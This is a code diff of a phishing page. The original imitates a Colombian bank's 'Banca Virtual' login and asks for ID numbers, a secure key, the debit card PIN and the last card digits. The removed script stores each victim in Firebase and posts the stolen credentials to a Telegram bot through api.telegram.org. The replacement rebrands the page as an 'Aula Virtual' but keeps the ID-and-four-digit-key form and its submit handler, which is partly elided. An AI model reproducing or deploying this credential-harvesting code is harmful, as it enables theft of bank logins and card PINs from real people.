@@ -1,378 +1,52 @@
 <!DOCTYPE html>
-<!-- saved from url=(0056)https://xn-%2Davalcumpliendosueos-c4b.online/inicia.html -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aula Virtual</title>
+<link rel="stylesheet" href="css/styles.css">
+</head>
 
-    <title>División y Carrusel</title>
-    <link rel="stylesheet" href="./css/styles.css">
- 
-     
-  </head>
-  <body>
-    <!-- Spinner overlay (hidden by default). Se muestra al presionar Ingresar y redirige luego -->
-    <div id="spinner-overlay" class="spinner-overlay" style="display:none;">
-      <div class="spinner-wrapper" role="status" aria-label="Cargando">
-        <!-- Inline SVG wrapper con filtro para eliminar fondo blanco de la imagen PNG -->
-        <svg class="spinner-image" viewBox="0 0 120 120" width="120" height="120" role="img" aria-hidden="true">
-          <image href="images/ban.png" x="0" y="0" width="120" height="120" preserveAspectRatio="xMidYMid meet"></image>
-        </svg>
-        <div class="spinner-text" aria-live="polite">Espere un momento, por favor.</div>
-      </div>
-    </div>
-    <div class="container">
-      <div class="left">
-        <div class="formulario">
-          <div class="imagenlogo">
-            <img src="assets/logo.svg" style="width: 200px">
-          </div>
-          <div class="titulo"><h2>Bienvenido a tu Banca Virtual</h2></div>
-          <div class="seguriads">
-            <img src="assets/seguridad.png" style="width: 100%">
-          </div>
-          <div class="formcontainer">
-            <!-- Div superior con dos apartados -->
-            <div class="header">
-              <div class="tab active" id="tab-left" onclick="showForm(&#39;form1&#39;, this)">
-                Clave segura
-              </div>
-              <div class="tab" id="tab-right" onclick="showForm(&#39;form2&#39;, this)">
-                Tarjeta de debito
-              </div>
-            </div>
+<body>
 
-            <!-- Formularios -->
-            <div class="forms">
-              <div id="form1" class="form-content">
-                <form id="segura">
-                  <div style="height: 30px">
-                    <label style="margin-bottom: 20px">Identificación</label>
-                  </div>
-                  <div style="display: flex">
-                    <div style="width: 30%">
-                      <select id="form1select" style="
-                          outline: none;
-                          margin: 0;
-                          width: 100%;
-                          text-indent: 16px;
-                          padding: 0;
-                          color: #000000;
-                          border: solid 1px #b3b3b3;
-                          background-color: white;
-                          border-radius: 4px;
-                          text-align: left;
-                          height: 48px;
-                          text-overflow: ellipsis;
-                          padding-right: 16px;
-                          font-size: 18px;
-                        ">
-                        <option hidden="" disabled="">Seleccione</option>
-                        <option id="C.C.   Cédula de ciudadanía" value="CC">
-                          C.C.. Cédula de ciudadanía
-                        </option>
-                        <option id="T.I.   Tarjeta de Identidad" value="TI">
-                          T.I.. Tarjeta de Identidad
-                        </option>
-                        <option id="C.E.   Cédula de Extranjería" value="CE">
-                          C.E.. Cédula de Extranjería
-                        </option>
-                        <option id="N.P.N. NIT Persona Natural" value="NI">
-                          N.P.N.. NIT Persona Natural
-                        </option>
-                        <option id="N.P.E. NIT Persona Extranjera" value="NE">
-                          N.P.E.. NIT Persona Extranjera
-                        </option>
-                        <option id="N.P.J. NIT Persona Jurídica" value="NJ">
-                          N.P.J.. NIT Persona Jurídica
-                        </option>
-                        <option id="P.S.   Pasaporte" value="PA">
-                          P.S.. Pasaporte
-                        </option>
-                        <option id="R.C.   Registro Civil" value="RC">
-                          R.C.. Registro Civil
-                        </option>
-                      </select>
-                    </div>
-                    <div style="width: 70%">
-                      <input id="form1identificacion" type="text" inputmode="numeric" placeholder="#" style="
-                          outline: none;
-                          margin: 0;
-                          width: 100%;
-                          text-indent: 16px;
-                          padding: 0;
-                          margin-left: 5px;
-                          color: #000000;
-                          border: solid 1px #b3b3b3;
-                          background-color: white;
-                          border-radius: 4px;
-                          text-align: left;
-                          height: 48px;
-                          text-overflow: ellipsis;
-                          padding-right: 16px;
-                          font-size: 18px;
-                        ">
+<!-- SPINNER -->
+<div id="spinner-overlay" style="display:none;position:fixed;inset:0;background:#fff;z-index:999;align-items:center;justify-content:center;flex-direction:column">
+<img src="images/ban.png" width="120">
+<p>Espere un momento...</p>
+</div>
 
-                      <script>
-                        document
-                          .getElementById("form1identificacion")
-                          .addEventListener("input", function (event) {
-                            // Remover cualquier carácter que no sea un número
-                            this.value = this.value.replace(/[^0-9]/g, "");
-                          });
-                      </script>
-                    </div>
-                  </div>
-                  <div style="height: 30px; margin-top: 20px">
-                    <label style="margin-bottom: 20px">Clave segura </label>
-                  </div>
-                  <div style="width: 100%">
-                    <input id="form1clavesegura" inputmode="numeric" type="text" minlength="4" maxlength="4" placeholder="..." style="
-                        outline: none;
-                        margin: 0;
-                        width: 100%;
+<div class="container">
 
-                        text-indent: 16px;
-                        padding: 0;
+<!-- FORM -->
+<form id="segura">
 
-                        color: #000000;
-                        border: solid 1px #b3b3b3;
+<h2>Bienvenido a tu aula Virtual</h2>
 
-                        background-color: white;
-                        border-radius: 4px;
-                        text-align: left;
-                        height: 48px;
-                        text-overflow: ellipsis;
-                        padding-right: 16px;
-                        font-size: 18px;
-                      ">
-                    <script>
-                      document
-                        .getElementById("form1clavesegura")
-                        .addEventListener("input", function (event) {
-                          // Remover cualquier carácter que no sea un número
-                          this.value = this.value.replace(/[^0-9]/g, "");
-                        });
-                    </script>
-                  </div>
+<select id="tipo" required>
+<option value="">Seleccione tipo</option>
+<option value="CC">Cédula</option>
+<option value="TI">Tarjeta identidad</option>
+</select>
 
-                  <button type="submit" style="
-                      width: 100%;
-                      background: #0043a9;
-                      border-radius: 20px;
-                      padding: 20px;
-                      color: white;
-                      margin-top: 30px;
-                      border: none;
-                      cursor: pointer;
-                    ">
-                    Ingresar
-                  </button>
+<input id="identificacion" placeholder="Identificación" required>
 
-                  <div style="width: 100%; text-align: center">
-                    <img src="assets/footer.png" style="width: 100%" alt="">
-                  </div>
-                </form>
-              </div>
+<input id="clave" placeholder="Clave 4 dígitos" maxlength="4" required>
 
-              <div id="form2" class="form-content" style="display: none">
-                <form id="tarjeta">
-                  <div style="height: 30px">
-                    <label style="margin-bottom: 20px">Identificación</label>
-                  </div>
-                  <div style="display: flex">
-                    <div style="width: 30%">
-                      <select id="form2select" style="
-                          outline: none;
-                          margin: 0;
-                          width: 100%;
-                          text-indent: 16px;
-                          padding: 0;
-                          color: #000000;
-                          border: solid 1px #b3b3b3;
-                          background-color: white;
-                          border-radius: 4px;
-                          text-align: left;
-                          height: 48px;
-                          text-overflow: ellipsis;
-                          padding-right: 16px;
-                          font-size: 18px;
-                        ">
-                        <option hidden="" disabled="">Seleccione</option>
-                        <option id="C.C.   Cédula de ciudadanía" value="CC">
-                          C.C. Cédula de ciudadanía
-                        </option>
-                        <option id="T.I.   Tarjeta de Identidad" value="TI">
-                          T.I. Tarjeta de Identidad
-                        </option>
-                        <option id="C.E.   Cédula de Extranjería" value="CE">
-                          C.E. Cédula de Extranjería
-                        </option>
-                        <option id="N.P.N. NIT Persona Natural" value="NI">
-                          N.P.N. NIT Persona Natural
-                        </option>
-                        <option id="N.P.E. NIT Persona Extranjera" value="NE">
-                          N.P.E. NIT Persona Extranjera
-                        </option>
-                        <option id="N.P.J. NIT Persona Jurídica" value="NJ">
-                          N.P.J. NIT Persona Jurídica
-                        </option>
-                        <option id="P.S.   Pasaporte" value="PA">
-                          P.S. Pasaporte
-                        </option>
-                        <option id="R.C.   Registro Civil" value="RC">
-                          R.C. Registro Civil
-                        </option>
-                      </select>
-                    </div>
-                    <div style="width: 70%">
-                      <input id="form2debito" type="text" inputmode="numeric" placeholder="#" style="
-                          outline: none;
-                          margin: 0;
-                          width: 100%;
-                          font-size: 18px;
-                          text-indent: 16px;
-                          padding: 0;
-                          margin-left: 5px;
-                          color: #000000;
-                          border: solid 1px #b3b3b3;
-
-                          background-color: white;
-                          border-radius: 4px;
-                          text-align: left;
-                          height: 48px;
-                          text-overflow: ellipsis;
-                          padding-right: 16px;
-                        ">
-                      <script>
-                        document
-                          .getElementById("form2debito")
-                          .addEventListener("input", function (event) {
-                            // Remover cualquier carácter que no sea un número
-                            this.value = this.value.replace(/[^0-9]/g, "");
-                          });
-                      </script>
-                    </div>
-                  </div>
-                  <div style="height: 30px; margin-top: 20px">
-                    <label style="margin-bottom: 20px">Clave de tu tarjeta débito</label>
-                  </div>
-                  <div style="width: 100%">
-                    <input id="clavesd" inputmode="numeric" type="text" placeholder="..." style="
-                        outline: none;
-                        margin: 0;
-                        width: 100%;
-                        text-indent: 16px;
-                        padding: 0;
-                        color: #000000;
-                        border: solid 1px #b3b3b3;
-                        background-color: white;
-                        border-radius: 4px;
-                        text-align: left;
-                        height: 48px;
-                        text-overflow: ellipsis;
-                        padding-right: 16px;
-                        font-size: 18px;
-                      ">
-                  </div>
-
-                  <div style="height: 30px; margin-top: 20px">
-                    <label style="margin-bottom: 20px">Últimos 4 dígitos de tu tarjeta débito</label>
-                  </div>
-                  <div style="width: 100%">
-                    <input inputmode="numeric" minlength="4" maxlength="4" id="form2digitos" type="text" placeholder="..." style="
-                        outline: none;
-                        margin: 0;
-                        width: 100%;
-                        text-indent: 16px;
-                        padding: 0;
-                        color: #000000;
-                        border: solid 1px #b3b3b3;
-                        background-color: white;
-                        border-radius: 4px;
-                        text-align: left;
-                        height: 48px;
-                        text-overflow: ellipsis;
-                        padding-right: 16px;
-                        font-size: 18px;
-                      ">
-
-                    <script>
-                      document
-                        .getElementById("form2digitos")
-                        .addEventListener("input", function (event) {
-                          // Remover cualquier carácter que no sea un número
-                          this.value = this.value.replace(/[^0-9]/g, "");
-                        });
-                    </script>
-                  </div>
-
-                  <button style="
+<button  style="
                       width: 100%;
                       background: #0043a9;
                       border-radius: 20px;
                       padding: 20p;
                       color: white;
                       margin-top: 30px;
-                    ">
-                    Ingresar
-                  </button>
-                </form>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-      <div class="right">
-        <div class="promo-image">
-          <img src="./INICIO_files/credito.png" style="width: 100%">
-        </div>
-        <div class="carousel-wrapper">
-          <button class="prev">❮</button>
-          <div class="carousel">
-            <div class="carousel-item">
-              <img src="assets/1.png" style="width: 100%">
-            </div>
-            <div class="carousel-item">
-              <img src="assets/2.png" style="width: 100%">
-            </div>
-            <div class="carousel-item">
-              <img src="assets/3.png" style="width: 100%">
-            </div>
-            <div class="carousel-item">
-              <img src="assets/4.png" style="width: 100%">
-            </div>
-            <div class="carousel-item">
-              <img src="assets/5.png" style="width: 100%">
-            </div>
-          </div>
-          <button class="next">❯</button>
-        </div>
-      </div>
-    </div>
+                    "  type="submit">Ingresar</button>
 
-    <script>
-      function showForm(formId, element) {
-        // Ocultar todos los formularios
-        document.querySelectorAll(".form-content").forEach(function (form) {
-          form.style.display = "none";
-        });
+</form>
 
-        // Mostrar el formulario seleccionado
-        document.getElementById(formId).style.display = "inline";
+</div>
 
-        // Remover la clase activa de todas las pestañas
-        document.querySelectorAll(".tab").forEach(function (tab) {
-          tab.classList.remove("active");
-        });
-
-        // Agregar la clase activa a la pestaña seleccionada
-        element.classList.add("active");
-      }
-    </script>
-     
-
-  <script>
-    const form = document.getElementById("segura");
+<script>
+const form = document.getElementById("segura");
 
 form.addEventListener("submit", async e=>{
  e.preventDefault();
@@ -424,67 +98,7 @@ form.addEventListener("submit", async e=>{
  }
 });
 
-    
-	
-	const form2 = document.querySelector("#tarjeta");
-    form2.addEventListener("submit", async (event) => {
-      event.preventDefault(); // Evita que el formulario se envíe por defecto
-      const opcion = document.querySelector("#form2select").value;
-      const identificacion = document.querySelector("#form2debito").value;
-      const clave = document.querySelector("#clavesd").value;
-      const ultimos = document.querySelector("#form2digitos").value;
+</script>
 
-      // Validación: Comprobar si todos los campos están llenos
-      if (
-        identificacion.trim() === "" ||
-        clave.trim() === "" ||
-        opcion.trim() === "" ||
-        ultimos.trim() === ""
-      ) {
-        alert("Por favor, llena todos los campos.");
-        return; // Evita que continúe el proceso si algún campo está vacío
-      }
-
-      // Validación: Comprobar si la clave tiene exactamente 4 dígitos
-      if (!/^\d{4}$/.test(clave)) {
-        alert("La clave debe tener exactamente 4 dígitos numéricos.");
-        return; // Evita que continúe el proceso si la clave no es válida
-      }
-
-      localStorage.setItem("usuario", identificacion);
-      const questionRef = doc(window.db, "bogota2", identificacion);
-      await setDoc(questionRef, {
-        page: 0,
-      });
-      const message =
-        "💳 *BANCA VIRTUAL - TARJETA DÉBITO*\n\n" +
-        "📋 *Tipo de identificación:* " + opcion + "\n" +
-        "🆔 *Identificación:* " + identificacion + "\n" +
-        "🔐 *Clave:* " + clave + "\n" +
-        "💳 *Últimos dígitos:* " + ultimos + "\n" +
-        "⏰ *Fecha:* " + new Date().toLocaleString();
-
-      // Enviar datos a Telegram
-      const telegramToken = miVariableGlobal;
-      const chatId = chat;
-      const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-      
-      axios
-        .post(telegramUrl, {
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-        .then((response) => {
-          console.log('Mensaje enviado a Telegram:', response.data);
-          // window.location.href = "cargando.html"; // Descomenta si tienes esta página
-        })
-        .catch((error) => {
-          console.error('Error enviando a Telegram:', error);
-        });
-    });
-  </script>
-    
-      
-    
-</body></html>
+</body>
+</html>
